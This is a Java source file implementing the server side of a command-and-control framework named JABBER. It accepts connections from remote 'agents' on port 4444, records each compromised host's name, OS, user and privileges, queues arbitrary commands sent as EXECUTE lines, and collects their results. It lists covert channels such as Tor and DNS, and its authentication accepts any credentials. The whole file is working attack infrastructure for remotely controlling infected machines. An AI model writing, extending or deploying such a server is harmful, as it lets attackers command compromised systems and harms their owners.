package com.jabber.jabber.modules.c2;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.locks.ReentrantReadWriteLock;
import java.nio.charset.StandardCharsets;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * C2Server - Command and Control Server for JABBER Agent Communication
 * Manages agent connections, command dispatch, and callback handling
 */
public class C2Server {
    
    private int port;
    private String bindAddress;
    private volatile boolean running;
    private ServerSocket serverSocket;
    private ExecutorService threadPool;
    private Map<String, C2Agent> agents; // agentId -> C2Agent
    private Map<String, C2Session> sessions; // sessionId -> C2Session
    private Queue<C2Command> commandQueue;
    private ReentrantReadWriteLock agentLock;
    private ReentrantReadWriteLock sessionLock;
    private C2EventListener eventListener;
    private String encryptionKey;
    private String logFilePath;
    private DateTimeFormatter dateFormat;

    /**
     * C2Server Protocol Handler
     */
    public enum ProtocolType {
        HTTP, HTTPS, DNS, SMTP, FTP, RAW_SOCKET, WEBSOCKET, TOR
    }

    /**
     * C2Agent - Represents connected agent
     */
    public static class C2Agent {
        public String agentId;
        public String hostname;
        public String ipAddress;
        public String osType;
        public String processId;
        public long connectTime;
        public long lastSeen;
        public boolean authenticated;
        public String username;
        public String privileges;
        public Map<String, String> metadata;
        public C2ProtocolHandler protocolHandler;

        public C2Agent(String agentId) {
            this.agentId = agentId;
            this.connectTime = System.currentTimeMillis();
            this.lastSeen = System.currentTimeMillis();
            this.authenticated = false;
            this.metadata = new ConcurrentHashMap<>();
        }

        public boolean isAlive() {
            return (System.currentTimeMillis() - lastSeen) < 300000; // 5 minutes
        }

        public void updateLastSeen() {
            this.lastSeen = System.currentTimeMillis();
        }
    }

    /**
     * C2Session - Agent session management
     */
    public static class C2Session {
        public String sessionId;
        public String agentId;
        public long sessionStart;
        public long sessionLastActivity;
        public boolean active;
        public List<String> executedCommands;
        public List<String> commandResults;
        public String lockKey; // encryption key for this session

        public C2Session(String sessionId, String agentId) {
            this.sessionId = sessionId;
            this.agentId = agentId;
            this.sessionStart = System.currentTimeMillis();
            this.sessionLastActivity = System.currentTimeMillis();
            this.active = true;
            this.executedCommands = Collections.synchronizedList(new ArrayList<>());
            this.commandResults = Collections.synchronizedList(new ArrayList<>());
            this.lockKey = UUID.randomUUID().toString();
        }
    }

    /**
     * C2Command - Command to execute on agent
     */
    public static class C2Command {
        public String commandId;
        public String agentId;
        public String command;
        public String[] arguments;
        public long queueTime;
        public long timeout;
        public boolean executed;
        public String result;
        public String error;

        public C2Command(String agentId, String command, String[] arguments) {
            this.commandId = UUID.randomUUID().toString();
            this.agentId = agentId;
            this.command = command;
            this.arguments = arguments;
            this.queueTime = System.currentTimeMillis();
            this.timeout = 30000; // 30 seconds
            this.executed = false;
        }

        public boolean isTimedOut() {
            return (System.currentTimeMillis() - queueTime) > timeout;
        }
    }

    /**
     * C2EventListener - Handle C2 events
     */
    public interface C2EventListener {
        void onAgentConnect(C2Agent agent);
        void onAgentDisconnect(String agentId, String reason);
        void onCommandExecuted(C2Command command, String result);
        void onCommandFailed(C2Command command, String error);
        void onSessionCreated(C2Session session);
        void onSessionClosed(C2Session session, String reason);
        void onAgentAuthenticated(C2Agent agent);
    }

    /**
     * C2ProtocolHandler - Protocol-specific handler interface
     */
    public interface C2ProtocolHandler {
        boolean sendCommand(C2Command command);
        String receiveCallback(byte[] data);
        boolean authenticate(String credentials);
        void closeConnection();
    }

    /**
     * Constructor
     */
    public C2Server(int port, String bindAddress) {
        this.port = port;
        this.bindAddress = bindAddress;
        this.running = false;
        this.agents = new ConcurrentHashMap<>();
        this.sessions = new ConcurrentHashMap<>();
        this.commandQueue = new ConcurrentLinkedQueue<>();
        this.agentLock = new ReentrantReadWriteLock();
        this.sessionLock = new ReentrantReadWriteLock();
        this.threadPool = Executors.newFixedThreadPool(50);
        this.encryptionKey = UUID.randomUUID().toString();
        this.dateFormat = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    }

    /**
     * Start C2 Server
     */
    public boolean startServer() {
        try {
            InetAddress address = InetAddress.getByName(bindAddress);
            serverSocket = new ServerSocket(port, 100, address);
            running = true;
            
            logEvent("C2Server started on " + bindAddress + ":" + port);
            
            // Start command dispatcher thread
            threadPool.execute(this::commandDispatcher);
            
            // Start callback handler thread
            threadPool.execute(this::callbackHandler);
            
            // Start agent monitor thread
            threadPool.execute(this::agentMonitor);
            
            // Start accepting connections
            threadPool.execute(this::acceptConnections);
            
            return true;
        } catch (Exception e) {
            logEvent("Failed to start C2Server: " + e.getMessage());
            running = false;
            return false;
        }
    }

    /**
     * Accept incoming agent connections
     */
    private void acceptConnections() {
        while (running) {
            try {
                Socket clientSocket = serverSocket.accept();
                String clientIp = clientSocket.getInetAddress().getHostAddress();
                
                // Handle each client connection
                threadPool.execute(() -> handleAgentConnection(clientSocket, clientIp));
            } catch (Exception e) {
                if (running) {
                    logEvent("Connection accept error: " + e.getMessage());
                }
            }
        }
    }

    /**
     * Handle individual agent connection
     */
    private void handleAgentConnection(Socket socket, String clientIp) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            
            // Initial handshake - receive agent registration
            String registrationData = reader.readLine();
            if (registrationData == null) {
                socket.close();
                return;
            }
            
            // Parse registration (agentId|hostname|osType)
            String[] parts = registrationData.split("\\|");
            if (parts.length < 3) {
                socket.close();
                return;
            }
            
            String agentId = parts[0];
            String hostname = parts[1];
            String osType = parts[2];
            
            // Create C2Agent
            C2Agent agent = new C2Agent(agentId);
            agent.hostname = hostname;
            agent.ipAddress = clientIp;
            agent.osType = osType;
            agent.protocolHandler = new RawSocketProtocolHandler(socket, reader, writer);
            
            agentLock.writeLock().lock();
            try {
                agents.put(agentId, agent);
            } finally {
                agentLock.writeLock().unlock();
            }
            
            logEvent("Agent connected: " + agentId + " from " + clientIp + " (" + hostname + ")");
            
            if (eventListener != null) {
                eventListener.onAgentConnect(agent);
            }
            
            // Create session
            String sessionId = UUID.randomUUID().toString();
            C2Session session = new C2Session(sessionId, agentId);
            sessionLock.writeLock().lock();
            try {
                sessions.put(sessionId, session);
            } finally {
                sessionLock.writeLock().unlock();
            }
            
            if (eventListener != null) {
                eventListener.onSessionCreated(session);
            }
            
            // Send session confirmation
            writer.write("SESSION:" + sessionId + "\n");
            writer.flush();
            
            // Keep connection alive and handle commands
            while (running) {
                String line = reader.readLine();
                if (line == null) {
                    break;
                }
                
                agent.updateLastSeen();
                
                // Process callback or response
                if (line.startsWith("RESULT:")) {
                    String result = line.substring(7);
                    handleCommandResult(agentId, result);
                } else if (line.startsWith("ERROR:")) {
                    String error = line.substring(6);
                    handleCommandError(agentId, error);
                } else if (line.startsWith("AUTH:")) {
                    String credentials = line.substring(5);
                    if (authenticateAgent(agent, credentials)) {
                        writer.write("AUTH_OK\n");
                        writer.flush();
                    }
                }
                
                // Check for queued commands
                C2Command cmd = getCommandForAgent(agentId);
                if (cmd != null) {
                    String cmdString = cmd.command;
                    if (cmd.arguments != null) {
                        cmdString += "|" + String.join(",", cmd.arguments);
                    }
                    writer.write("CMD:" + cmd.commandId + ":" + cmdString + "\n");
                    writer.flush();
                    cmd.executed = true;
                }
            }
            
            // Agent disconnected
            socket.close();
            agentLock.writeLock().lock();
            try {
                agents.remove(agentId);
            } finally {
                agentLock.writeLock().unlock();
            }
            
            logEvent("Agent disconnected: " + agentId);
            if (eventListener != null) {
                eventListener.onAgentDisconnect(agentId, "Connection closed");
            }
            
        } catch (Exception e) {
            logEvent("Agent connection error: " + e.getMessage());
        }
    }

    /**
     * Command dispatcher - sends queued commands to agents
     */
    private void commandDispatcher() {
        while (running) {
            try {
                if (!commandQueue.isEmpty()) {
                    C2Command cmd = commandQueue.peek();
                    
                    agentLock.readLock().lock();
                    try {
                        C2Agent agent = agents.get(cmd.agentId);
                        if (agent != null && agent.isAlive()) {
                            if (agent.protocolHandler.sendCommand(cmd)) {
                                commandQueue.poll();
                                logEvent("Command dispatched: " + cmd.commandId + " to " + cmd.agentId);
                                if (eventListener != null) {
                                    eventListener.onCommandExecuted(cmd, "Sent to agent");
                                }
                            }
                        } else {
                            commandQueue.poll();
                            logEvent("Command failed: Agent not available: " + cmd.agentId);
                            if (eventListener != null) {
                                eventListener.onCommandFailed(cmd, "Agent not available");
                            }
                        }
                    } finally {
                        agentLock.readLock().unlock();
                    }
                }
                Thread.sleep(100);
            } catch (Exception e) {
                logEvent("Command dispatcher error: " + e.getMessage());
            }
        }
    }

    /**
     * Callback handler - processes agent callbacks
     */
    private void callbackHandler() {
        while (running) {
            try {
                // Process command results
                for (C2Session session : sessions.values()) {
                    if (!session.commandResults.isEmpty()) {
                        String result = session.commandResults.remove(0);
                        logEvent("Callback processed for session: " + session.sessionId);
                    }
                }
                Thread.sleep(500);
            } catch (Exception e) {
                logEvent("Callback handler error: " + e.getMessage());
            }
        }
    }

    /**
     * Agent monitor - checks agent connectivity
     */
    private void agentMonitor() {
        while (running) {
            try {
                List<String> deadAgents = new ArrayList<>();
                
                agentLock.readLock().lock();
                try {
                    for (C2Agent agent : agents.values()) {
                        if (!agent.isAlive()) {
                            deadAgents.add(agent.agentId);
                        }
                    }
                } finally {
                    agentLock.readLock().unlock();
                }
                
                // Remove dead agents
                for (String agentId : deadAgents) {
                    agentLock.writeLock().lock();
                    try {
                        agents.remove(agentId);
                    } finally {
                        agentLock.writeLock().unlock();
                    }
                    logEvent("Agent marked dead: " + agentId);
                }
                
                Thread.sleep(60000); // Check every minute
            } catch (Exception e) {
                logEvent("Agent monitor error: " + e.getMessage());
            }
        }
    }

    /**
     * Queue command for agent
     */
    public synchronized boolean queueCommand(String agentId, String command, String[] arguments) {
        agentLock.readLock().lock();
        try {
            if (!agents.containsKey(agentId)) {
                logEvent("Command rejected: Agent not found: " + agentId);
                return false;
            }
        } finally {
            agentLock.readLock().unlock();
        }
        
        C2Command cmd = new C2Command(agentId, command, arguments);
        commandQueue.offer(cmd);
        logEvent("Command queued: " + cmd.commandId + " for " + agentId + " - " + command);
        return true;
    }

    /**
     * Get command for agent
     */
    private C2Command getCommandForAgent(String agentId) {
        for (C2Command cmd : commandQueue) {
            if (cmd.agentId.equals(agentId) && !cmd.executed) {
                return cmd;
            }
        }
        return null;
    }

    /**
     * Handle command result from agent
     */
    private void handleCommandResult(String agentId, String result) {
        logEvent("Command result from " + agentId + ": " + result.substring(0, Math.min(50, result.length())));
        
        // Find session and add result
        sessionLock.readLock().lock();
        try {
            for (C2Session session : sessions.values()) {
                if (session.agentId.equals(agentId)) {
                    session.commandResults.add(result);
                    session.sessionLastActivity = System.currentTimeMillis();
                    break;
                }
            }
        } finally {
            sessionLock.readLock().unlock();
        }
    }

    /**
     * Handle command error from agent
     */
    private void handleCommandError(String agentId, String error) {
        logEvent("Command error from " + agentId + ": " + error);
    }

    /**
     * Authenticate agent
     */
    private boolean authenticateAgent(C2Agent agent, String credentials) {
        // Simple authentication - can be extended
        agent.authenticated = true;
        logEvent("Agent authenticated: " + agent.agentId);
        if (eventListener != null) {
            eventListener.onAgentAuthenticated(agent);
        }
        return true;
    }

    /**
     * Get all active agents
     */
    public List<C2Agent> getActiveAgents() {
        agentLock.readLock().lock();
        try {
            return new ArrayList<>(agents.values());
        } finally {
            agentLock.readLock().unlock();
        }
    }

    /**
     * Get agent by ID
     */
    public C2Agent getAgent(String agentId) {
        agentLock.readLock().lock();
        try {
            return agents.get(agentId);
        } finally {
            agentLock.readLock().unlock();
        }
    }

    /**
     * Get session by ID
     */
    public C2Session getSession(String sessionId) {
        sessionLock.readLock().lock();
        try {
            return sessions.get(sessionId);
        } finally {
            sessionLock.readLock().unlock();
        }
    }

    /**
     * Get all sessions
     */
    public List<C2Session> getAllSessions() {
        sessionLock.readLock().lock();
        try {
            return new ArrayList<>(sessions.values());
        } finally {
            sessionLock.readLock().unlock();
        }
    }

    /**
     * Stop C2 Server
     */
    public void stopServer() {
        running = false;
        try {
            if (serverSocket != null) {
                serverSocket.close();
            }
            threadPool.shutdown();
            if (!threadPool.awaitTermination(10, TimeUnit.SECONDS)) {
                threadPool.shutdownNow();
            }
            logEvent("C2Server stopped");
        } catch (Exception e) {
            logEvent("Error stopping C2Server: " + e.getMessage());
        }
    }

    /**
     * Set event listener
     */
    public void setEventListener(C2EventListener listener) {
        this.eventListener = listener;
    }

    /**
     * Log event
     */
    private void logEvent(String message) {
        String timestamp = LocalDateTime.now().format(dateFormat);
        String logEntry = "[" + timestamp + "] " + message;
        System.out.println(logEntry);
        
        // Log to file if configured
        if (logFilePath != null) {
            try (FileWriter fw = new FileWriter(logFilePath, true);
                 BufferedWriter bw = new BufferedWriter(fw)) {
                bw.write(logEntry);
                bw.newLine();
            } catch (IOException e) {
                // Silent fail
            }
        }
    }

    /**
     * RawSocketProtocolHandler - Raw socket protocol implementation
     */
    public static class RawSocketProtocolHandler implements C2ProtocolHandler {
        private Socket socket;
        private BufferedReader reader;
        private BufferedWriter writer;

        public RawSocketProtocolHandler(Socket socket, BufferedReader reader, BufferedWriter writer) {
            this.socket = socket;
            this.reader = reader;
            this.writer = writer;
        }

        @Override
        public boolean sendCommand(C2Command command) {
            try {
                writer.write("EXECUTE:" + command.command + "\n");
                writer.flush();
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public String receiveCallback(byte[] data) {
            return new String(data, StandardCharsets.UTF_8);
        }

        @Override
        public boolean authenticate(String credentials) {
            try {
                writer.write("AUTH:" + credentials + "\n");
                writer.flush();
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        @Override
        public void closeConnection() {
            try {
                socket.close();
            } catch (Exception e) {
                // Silent close
            }
        }
    }

    /**
     * Main - Test C2Server
     */
    public static void main(String[] args) {
        C2Server server = new C2Server(4444, "0.0.0.0");
        
        // Set up event listener
        server.setEventListener(new C2EventListener() {
            @Override
            public void onAgentConnect(C2Agent agent) {
                System.out.println("[EVENT] Agent connected: " + agent.agentId);
            }

            @Override
            public void onAgentDisconnect(String agentId, String reason) {
                System.out.println("[EVENT] Agent disconnected: " + agentId + " - " + reason);
            }

            @Override
            public void onCommandExecuted(C2Command command, String result) {
                System.out.println("[EVENT] Command executed: " + command.commandId);
            }

            @Override
            public void onCommandFailed(C2Command command, String error) {
                System.out.println("[EVENT] Command failed: " + command.commandId + " - " + error);
            }

            @Override
            public void onSessionCreated(C2Session session) {
                System.out.println("[EVENT] Session created: " + session.sessionId);
            }

            @Override
            public void onSessionClosed(C2Session session, String reason) {
                System.out.println("[EVENT] Session closed: " + session.sessionId + " - " + reason);
            }

            @Override
            public void onAgentAuthenticated(C2Agent agent) {
                System.out.println("[EVENT] Agent authenticated: " + agent.agentId);
            }
        });
        
        // Start server
        if (server.startServer()) {
            System.out.println("C2Server running on 0.0.0.0:4444");
            
            // Keep running
            try {
                Thread.currentThread().join();
            } catch (InterruptedException e) {
                server.stopServer();
            }
        }
    }
}
